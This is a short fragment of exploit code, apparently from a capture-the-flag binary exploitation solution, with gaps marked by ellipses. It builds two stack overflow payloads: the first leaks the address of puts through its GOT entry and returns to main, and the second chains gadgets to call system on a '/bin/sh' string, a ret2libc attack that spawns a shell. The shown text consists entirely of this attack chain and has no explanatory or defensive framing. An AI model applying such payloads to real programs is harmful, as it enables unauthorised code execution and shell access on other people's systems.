...
payload1="A"*0x88 +p64(candy)+'b'*8+p64(pop_add)+p64(puts_got)+p64(puts_plt)+p64(main_add)
...
payload2='A'*0x88
payload2+= p64(candy) + "A" * 0x8 +p64(pop_add)+p64(binsh_add)+p64(sys_add)#+p64(main_add)
